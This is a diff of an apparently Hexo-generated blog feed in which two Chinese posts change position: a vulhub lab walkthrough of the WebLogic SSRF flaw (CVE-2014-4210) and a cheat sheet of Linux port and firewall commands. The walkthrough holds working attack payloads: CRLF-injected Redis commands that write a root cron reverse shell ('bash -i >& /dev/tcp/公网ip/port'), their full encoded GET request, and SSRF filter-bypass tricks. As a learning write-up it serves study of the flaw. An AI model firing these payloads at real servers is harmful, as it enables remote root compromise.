+<p>访问<code>ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
+<p>​    <img src="https://i.loli.net/2021/07/18/E3xOf6zXK4kup1G.png" alt="image-20210718160744237"></p>
+<h4 id="探测内网状态"><a href="#探测内网状态" class="headerlink" title="探测内网状态"></a>探测内网状态</h4><p><img src="https://i.loli.net/2021/07/18/aQI3ivkAp8MFUcV.png" alt="image-20210718162349626"></p>
+<p>构造payload来检验端口是否开放并且是否为HTTP协议<code>operator=http://127.0.0.1:7001</code>，返回<code>status code</code>就说明端口开放并且为HTTP协议</p>
+<p><img src="https://i.loli.net/2021/07/18/r2c6UPX3liFnHxC.png" alt="image-20210718162817388"></p>
+<p>尝试一个不存在的端口<code>7777</code>，返回<code>could not connect over HTTP to server</code>，就是说明端口不存在</p>
+<p><img src="https://i.loli.net/2021/07/18/1MaoVAP6WU9kXwd.png" alt="image-20210718163712297"></p>
+<p>如果端口开放访问的是非http协议，则会返回<code>did not have a valid SOAP content-type</code></p>
+<p><img src="https://i.loli.net/2021/07/18/a921AiY4epylb5h.png" alt="image-20210718164622656"></p>
+<p>在查看Redis端口开放状态时，一直不行，看一下才发现是没有起来</p>
+<p><img src="https://i.loli.net/2021/07/18/JcSrjMtdWQusE89.png" alt="image-20210718171022778"></p>
+<h4 id="探测Redis端口情况"><a href="#探测Redis端口情况" class="headerlink" title="探测Redis端口情况"></a>探测Redis端口情况</h4><p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现<code>172.18.0.1:6379</code>可以连通：</p>
+<blockquote>
+<p>也可以写个脚本跑一下</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/07/18/nDTQKp3m9Zro1uH.png" alt="image-20210718171256048"></p>
+<h4 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h4><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器</p>
+<h4 id="发送Redis命令，将弹shell脚本写入-etc-crontab"><a href="#发送Redis命令，将弹shell脚本写入-etc-crontab" class="headerlink" title="发送Redis命令，将弹shell脚本写入/etc/crontab"></a>发送Redis命令，将弹shell脚本写入<code>/etc/crontab</code></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;公网ip&#x2F;port 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="对其进行url编码"><a href="#对其进行url编码" class="headerlink" title="对其进行url编码"></a>对其进行url编码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F公网ip%2F监听端口%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave</span><br></pre></td></tr></table></figure>
+<p>注：换行符是“\r\n”，也就是“%0D%0A”</p>
+<blockquote>
+<p>\r是回车，\n是换行</p>
+</blockquote>
+<p>将url编码后的字符串放在ssrf域名后面，go</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.18.0.1:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F公网ip%2F监听端口%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/18/4B1TI6QFdS7uNtH.png" alt="image-20210718201905032"></p>
+<p><code>nc -lvp 4444</code></p>
+<p>可进行利用的cron还有以下几个地方</p>
+<ul>
+<li>/etc/crontab 这个是肯定的</li>
+<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
+<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
+<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
+</ul>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ol>
+<li><p>@　　　　　　　　　　<a href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p>
+</li>
+<li><p>添加端口号　　　　　　<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
+</li>
+<li><p>短地址　　　　　　　　<a href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a></p>
+</li>
+<li><p>可以指向任意ip的域名　 xip.io</p>
+</li>
+<li><p>ip地址转换成进制来访问 192.168.0.1=32322</p>
+</li>
+</ol>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.freebuf.com/company-information/220086.html">SSRF漏洞攻击原理及防御方案</a></p>
+<p><a href="https://www.t00ls.net/articles-41070.html">SSRF漏洞(原理&amp;绕过姿势)</a></p>
+<p><a href="https://blog.csdn.net/weixin_41679427/article/details/110312158">SSRF攻击姿势汇总</a></p>
+<p><a href="https://blog.csdn.net/lhh134/article/details/88298881">Weblogic SSRF漏洞（CVE-2014-4210）</a></p>
+<p><a href="https://blog.csdn.net/weixin_46789316/article/details/116531565">漏洞复现-vulhub复现Weblogic的SSRF漏洞</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>常见web漏洞学习之文件上传知识点总结</title>
     <url>/2021/05/26/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h2 id="常见web漏洞学习之文件上传"><a href="#常见web漏洞学习之文件上传" class="headerlink" title="常见web漏洞学习之文件上传"></a>常见web漏洞学习之文件上传</h2><blockquote>
@@ -1522,94 +1618,35 @@
       </tags>
   </entry>
   <entry>
-    <title>常见web漏洞学习之SSRF</title>
-    <url>/2021/07/15/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BSSRF/</url>
-    <content><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><img src="https://i.loli.net/2021/07/17/FxWvNe42sRnGHqt.png" alt="image-20210717161639133"></p>
-<p><img src="https://i.loli.net/2021/07/17/smd1vkM65KeSaHn.png" alt="image-20210717161814292"></p>
-<p><img src="https://i.loli.net/2021/07/17/UvSWRuVZxiHkomn.png" alt="image-20210717161911196"></p>
-<p><img src="https://i.loli.net/2021/07/17/HsaJXe45FlEY9cL.jpg" alt="img"></p>
-<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Server Side Request Forgery 服务端请求伪造</p>
-<p>是由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>很多web应用都提供了从其他的服务器上获取数据的功能，如使用指定的url，web应用就可以获取图片，下载文件，读取文件内容等（这个url是远程的url，并不是本地的，<del>说了个废话</del>）</p>
-<p>SSRF的实质是<strong>利用存在缺陷的web应用作为代理来进行攻击</strong>远程和本地的服务器</p>
-<p>SSRF形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>且没有<strong>对目标地址做过滤与限制</strong></p>
-<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p><img src="https://i.loli.net/2021/07/18/HKf8lbk4BOJeNdA.jpg" alt="9907e251f785494d92c746eb5df60541"></p>
-<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
-<li>内外网的端口和服务扫描</li>
-<li>对内网Web应用进行指纹识别，识别企业内部的资产信息，通过访问默认文件实现(如：readme文件)</li>
-<li>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等</li>
-<li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li>
-<li>下载内网资源，利用file协议读取本地敏感数据文件等</li>
-<li>进行跳板</li>
-</ul>
-<h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><ul>
-<li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li>
-<li>http/https协议：探测内网主机存活</li>
-<li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
-<li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li>
-</ul>
-<h3 id="weblogic-ssrf复现"><a href="#weblogic-ssrf复现" class="headerlink" title="weblogic ssrf复现"></a>weblogic ssrf复现</h3><h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><p><img src="https://i.loli.net/2021/07/18/64S8lLxKy1sbThH.png" alt="image-20210718153704526"></p>
-<p>查看靶场说明</p>
-<p>进入weblogic的ssrf的目录下，使用<code>gedit</code>命令查看<code>README.md</code></p>
-<p><img src="https://i.loli.net/2021/07/18/NioHV94KcWQdUkC.png" alt="image-20210718154456328"></p>
-<p>xshell会让提示下Xmanger</p>
-<p><img src="https://i.loli.net/2021/07/18/AdLikoaK5s18p9V.png" alt="image-20210718154647511"></p>
-<p>直接下本地看</p>
-<p>访问<code>ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用</p>
-<p><img src="https://i.loli.net/2021/07/18/SlbMwNYxXPvj9aQ.png" alt="image-20210718155843581"></p>
-<p>访问<code>ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
-<p>​    <img src="https://i.loli.net/2021/07/18/E3xOf6zXK4kup1G.png" alt="image-20210718160744237"></p>
-<h4 id="探测内网状态"><a href="#探测内网状态" class="headerlink" title="探测内网状态"></a>探测内网状态</h4><p><img src="https://i.loli.net/2021/07/18/aQI3ivkAp8MFUcV.png" alt="image-20210718162349626"></p>
-<p>构造payload来检验端口是否开放并且是否为HTTP协议<code>operator=http://127.0.0.1:7001</code>，返回<code>status code</code>就说明端口开放并且为HTTP协议</p>
-<p><img src="https://i.loli.net/2021/07/18/r2c6UPX3liFnHxC.png" alt="image-20210718162817388"></p>
-<p>尝试一个不存在的端口<code>7777</code>，返回<code>could not connect over HTTP to server</code>，就是说明端口不存在</p>
-<p><img src="https://i.loli.net/2021/07/18/1MaoVAP6WU9kXwd.png" alt="image-20210718163712297"></p>
-<p>如果端口开放访问的是非http协议，则会返回<code>did not have a valid SOAP content-type</code></p>
-<p><img src="https://i.loli.net/2021/07/18/a921AiY4epylb5h.png" alt="image-20210718164622656"></p>
-<p>在查看Redis端口开放状态时，一直不行，看一下才发现是没有起来</p>
-<p><img src="https://i.loli.net/2021/07/18/JcSrjMtdWQusE89.png" alt="image-20210718171022778"></p>
-<h4 id="探测Redis端口情况"><a href="#探测Redis端口情况" class="headerlink" title="探测Redis端口情况"></a>探测Redis端口情况</h4><p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现<code>172.18.0.1:6379</code>可以连通：</p>
-<blockquote>
-<p>也可以写个脚本跑一下</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/07/18/nDTQKp3m9Zro1uH.png" alt="image-20210718171256048"></p>
-<h4 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h4><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器</p>
-<h4 id="发送Redis命令，将弹shell脚本写入-etc-crontab"><a href="#发送Redis命令，将弹shell脚本写入-etc-crontab" class="headerlink" title="发送Redis命令，将弹shell脚本写入/etc/crontab"></a>发送Redis命令，将弹shell脚本写入<code>/etc/crontab</code></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;公网ip&#x2F;port 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="对其进行url编码"><a href="#对其进行url编码" class="headerlink" title="对其进行url编码"></a>对其进行url编码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F公网ip%2F监听端口%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave</span><br></pre></td></tr></table></figure>
-<p>注：换行符是“\r\n”，也就是“%0D%0A”</p>
-<blockquote>
-<p>\r是回车，\n是换行</p>
-</blockquote>
-<p>将url编码后的字符串放在ssrf域名后面，go</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.18.0.1:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F公网ip%2F监听端口%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/18/4B1TI6QFdS7uNtH.png" alt="image-20210718201905032"></p>
-<p><code>nc -lvp 4444</code></p>
-<p>可进行利用的cron还有以下几个地方</p>
-<ul>
-<li>/etc/crontab 这个是肯定的</li>
-<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
-<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
-<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
-</ul>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ol>
-<li><p>@　　　　　　　　　　<a href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p>
-</li>
-<li><p>添加端口号　　　　　　<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
-</li>
-<li><p>短地址　　　　　　　　<a href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a></p>
-</li>
-<li><p>可以指向任意ip的域名　 xip.io</p>
-</li>
-<li><p>ip地址转换成进制来访问 192.168.0.1=32322</p>
-</li>
-</ol>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.freebuf.com/company-information/220086.html">SSRF漏洞攻击原理及防御方案</a></p>
-<p><a href="https://www.t00ls.net/articles-41070.html">SSRF漏洞(原理&amp;绕过姿势)</a></p>
-<p><a href="https://blog.csdn.net/weixin_41679427/article/details/110312158">SSRF攻击姿势汇总</a></p>
-<p><a href="https://blog.csdn.net/lhh134/article/details/88298881">Weblogic SSRF漏洞（CVE-2014-4210）</a></p>
-<p><a href="https://blog.csdn.net/weixin_46789316/article/details/116531565">漏洞复现-vulhub复现Weblogic的SSRF漏洞</a></p>
+    <title>端口那些事</title>
+    <url>/2021/06/28/%E7%AB%AF%E5%8F%A3%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
+    <content><![CDATA[<p>想要开放端口，要先去了解防火墙状态和网络命令</p>
+<h2 id="centos下"><a href="#centos下" class="headerlink" title="centos下"></a>centos下</h2><h3 id="查看已经开放的所有端口"><a href="#查看已经开放的所有端口" class="headerlink" title="查看已经开放的所有端口"></a>查看已经开放的所有端口</h3><p> <code>netstat -anp</code></p>
+<h3 id="查看端口被哪个服务占用"><a href="#查看端口被哪个服务占用" class="headerlink" title="查看端口被哪个服务占用"></a>查看端口被哪个服务占用</h3><p><code>netstat -anp | grep 端口号</code></p>
+<h3 id="查看防火墙状态"><a href="#查看防火墙状态" class="headerlink" title="查看防火墙状态"></a>查看防火墙状态</h3><p><code>systemctl status firewalld</code></p>
+<p><img src="https://i.loli.net/2021/07/05/qgC2dVhBQRUEc84.png" alt="image-20210705163816093"></p>
+<p><img src="https://i.loli.net/2021/07/05/d5mTi73gSVhyGMP.png" alt="image-20210705095620194"></p>
+<h3 id="查看进程的详细信息"><a href="#查看进程的详细信息" class="headerlink" title="查看进程的详细信息"></a>查看进程的详细信息</h3><p> <code>ps PID</code></p>
+<p><img src="https://i.loli.net/2021/07/05/GEUzN6YjfeWwgO7.png"></p>
+<h3 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h3><p> <code>kill -9 PID</code></p>
+<h3 id="开启-关闭防火墙："><a href="#开启-关闭防火墙：" class="headerlink" title="开启/关闭防火墙："></a>开启/关闭防火墙：</h3><p><code>systemctl start/stop firewalld</code></p>
+<h3 id="查看防火墙所有开放的端口："><a href="#查看防火墙所有开放的端口：" class="headerlink" title="查看防火墙所有开放的端口："></a>查看防火墙所有开放的端口：</h3><p><code>firewall-cmd --zone=public --list-ports</code></p>
+<p><img src="https://i.loli.net/2021/07/05/T7Vr2jNFoUflEWb.png" alt="image-20210705162443473"></p>
+<h3 id="查看某一端口是否开放："><a href="#查看某一端口是否开放：" class="headerlink" title="查看某一端口是否开放："></a>查看某一端口是否开放：</h3><p><code>firewall-cmd --query-port=端口/tcp</code></p>
+<p><img src="https://i.loli.net/2021/07/05/F7jXHMA5IsGNnwx.png" alt="image-20210705163024044"></p>
+<h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p><code>firewall-cmd --add-port=端口号/tcp --permanent</code></p>
+<h3 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h3><p><code>firewall-cmd --permanent --remove-port=端口号/tcp</code></p>
+<p><img src="https://i.loli.net/2021/08/19/87XlK9j1esyLfGR.png" alt="image-20210819175722813"></p>
+<h2 id="ubuntu-下还略有不同"><a href="#ubuntu-下还略有不同" class="headerlink" title="ubuntu 下还略有不同"></a>ubuntu 下还略有不同</h2><h3 id="查看防火墙当前状态"><a href="#查看防火墙当前状态" class="headerlink" title="查看防火墙当前状态"></a>查看防火墙当前状态</h3><p><code>ufw status</code></p>
+<p><img src="https://i.loli.net/2021/07/05/RMgqjh9wQPKvmS6.png" alt="image-20210705180504549"></p>
+<h3 id="开启-关闭防火墙"><a href="#开启-关闭防火墙" class="headerlink" title="开启/关闭防火墙"></a>开启/关闭防火墙</h3><p><code>ufw enable/disable</code></p>
+<h3 id="查看防火墙版本"><a href="#查看防火墙版本" class="headerlink" title="查看防火墙版本"></a>查看防火墙版本</h3><p><code>ufw version</code></p>
+<h3 id="开放某一端口"><a href="#开放某一端口" class="headerlink" title="开放某一端口"></a>开放某一端口</h3><p><code>ufw allow 端口号</code></p>
+<h3 id="禁止某一端口"><a href="#禁止某一端口" class="headerlink" title="禁止某一端口"></a>禁止某一端口</h3><p><code>ufw delete allow  端口号</code>或是<code>ufw deny 端口号</code></p>
+<h3 id="允许-拒绝外部访问本机"><a href="#允许-拒绝外部访问本机" class="headerlink" title="允许/拒绝外部访问本机"></a>允许/拒绝外部访问本机</h3><p><code>ufw default allow/deny</code></p>
+<h3 id="允许某一网段的ip进行访问"><a href="#允许某一网段的ip进行访问" class="headerlink" title="允许某一网段的ip进行访问"></a>允许某一网段的ip进行访问</h3><p><code>ufw allow from 10.0.0.0/8</code></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/realjh/article/details/82048492">Linux下Centos7对外开放端口</a></p>
+<p><a href="https://www.cnblogs.com/heqiuyong/p/10460150.html">Centos7开放及查看端口</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -1999,38 +2036,6 @@
       <tags>
         <tag>内网</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>端口那些事</title>
-    <url>/2021/06/28/%E7%AB%AF%E5%8F%A3%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
-    <content><![CDATA[<p>想要开放端口，要先去了解防火墙状态和网络命令</p>
-<h2 id="centos下"><a href="#centos下" class="headerlink" title="centos下"></a>centos下</h2><h3 id="查看已经开放的所有端口"><a href="#查看已经开放的所有端口" class="headerlink" title="查看已经开放的所有端口"></a>查看已经开放的所有端口</h3><p> <code>netstat -anp</code></p>
-<h3 id="查看端口被哪个服务占用"><a href="#查看端口被哪个服务占用" class="headerlink" title="查看端口被哪个服务占用"></a>查看端口被哪个服务占用</h3><p><code>netstat -anp | grep 端口号</code></p>
-<h3 id="查看防火墙状态"><a href="#查看防火墙状态" class="headerlink" title="查看防火墙状态"></a>查看防火墙状态</h3><p><code>systemctl status firewalld</code></p>
-<p><img src="https://i.loli.net/2021/07/05/qgC2dVhBQRUEc84.png" alt="image-20210705163816093"></p>
-<p><img src="https://i.loli.net/2021/07/05/d5mTi73gSVhyGMP.png" alt="image-20210705095620194"></p>
-<h3 id="查看进程的详细信息"><a href="#查看进程的详细信息" class="headerlink" title="查看进程的详细信息"></a>查看进程的详细信息</h3><p> <code>ps PID</code></p>
-<p><img src="https://i.loli.net/2021/07/05/GEUzN6YjfeWwgO7.png"></p>
-<h3 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h3><p> <code>kill -9 PID</code></p>
-<h3 id="开启-关闭防火墙："><a href="#开启-关闭防火墙：" class="headerlink" title="开启/关闭防火墙："></a>开启/关闭防火墙：</h3><p><code>systemctl start/stop firewalld</code></p>
-<h3 id="查看防火墙所有开放的端口："><a href="#查看防火墙所有开放的端口：" class="headerlink" title="查看防火墙所有开放的端口："></a>查看防火墙所有开放的端口：</h3><p><code>firewall-cmd --zone=public --list-ports</code></p>
-<p><img src="https://i.loli.net/2021/07/05/T7Vr2jNFoUflEWb.png" alt="image-20210705162443473"></p>
-<h3 id="查看某一端口是否开放："><a href="#查看某一端口是否开放：" class="headerlink" title="查看某一端口是否开放："></a>查看某一端口是否开放：</h3><p><code>firewall-cmd --query-port=端口/tcp</code></p>
-<p><img src="https://i.loli.net/2021/07/05/F7jXHMA5IsGNnwx.png" alt="image-20210705163024044"></p>
-<h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p><code>firewall-cmd --add-port=端口号/tcp --permanent</code></p>
-<h3 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h3><p><code>firewall-cmd --permanent --remove-port=端口号/tcp</code></p>
-<p><img src="https://i.loli.net/2021/08/19/87XlK9j1esyLfGR.png" alt="image-20210819175722813"></p>
-<h2 id="ubuntu-下还略有不同"><a href="#ubuntu-下还略有不同" class="headerlink" title="ubuntu 下还略有不同"></a>ubuntu 下还略有不同</h2><h3 id="查看防火墙当前状态"><a href="#查看防火墙当前状态" class="headerlink" title="查看防火墙当前状态"></a>查看防火墙当前状态</h3><p><code>ufw status</code></p>
-<p><img src="https://i.loli.net/2021/07/05/RMgqjh9wQPKvmS6.png" alt="image-20210705180504549"></p>
-<h3 id="开启-关闭防火墙"><a href="#开启-关闭防火墙" class="headerlink" title="开启/关闭防火墙"></a>开启/关闭防火墙</h3><p><code>ufw enable/disable</code></p>
-<h3 id="查看防火墙版本"><a href="#查看防火墙版本" class="headerlink" title="查看防火墙版本"></a>查看防火墙版本</h3><p><code>ufw version</code></p>
-<h3 id="开放某一端口"><a href="#开放某一端口" class="headerlink" title="开放某一端口"></a>开放某一端口</h3><p><code>ufw allow 端口号</code></p>
-<h3 id="禁止某一端口"><a href="#禁止某一端口" class="headerlink" title="禁止某一端口"></a>禁止某一端口</h3><p><code>ufw delete allow  端口号</code>或是<code>ufw deny 端口号</code></p>
-<h3 id="允许-拒绝外部访问本机"><a href="#允许-拒绝外部访问本机" class="headerlink" title="允许/拒绝外部访问本机"></a>允许/拒绝外部访问本机</h3><p><code>ufw default allow/deny</code></p>
-<h3 id="允许某一网段的ip进行访问"><a href="#允许某一网段的ip进行访问" class="headerlink" title="允许某一网段的ip进行访问"></a>允许某一网段的ip进行访问</h3><p><code>ufw allow from 10.0.0.0/8</code></p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/realjh/article/details/82048492">Linux下Centos7对外开放端口</a></p>
-<p><a href="https://www.cnblogs.com/heqiuyong/p/10460150.html">Centos7开放及查看端口</a></p>
-]]></content>
   </entry>
   <entry>
     <title>常见web漏洞学习之sql注入学习</title>
